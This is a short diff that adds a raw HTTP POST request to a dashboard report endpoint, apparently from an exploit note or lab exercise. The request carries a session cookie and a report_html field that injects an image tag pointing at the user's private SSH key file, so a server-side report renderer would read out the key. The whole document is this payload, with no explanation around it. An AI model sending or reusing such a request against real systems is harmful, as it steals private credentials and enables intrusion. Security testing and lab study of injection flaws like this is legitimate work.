@@ -1,0 +1,5 @@
+POST /dashboard/report HTTP/1.1
+Cookie: session=<tommy>
+Content-Type: application/x-www-form-urlencoded
+
+report_html=<img src="file:///home/tommy/.ssh/id_rsa">
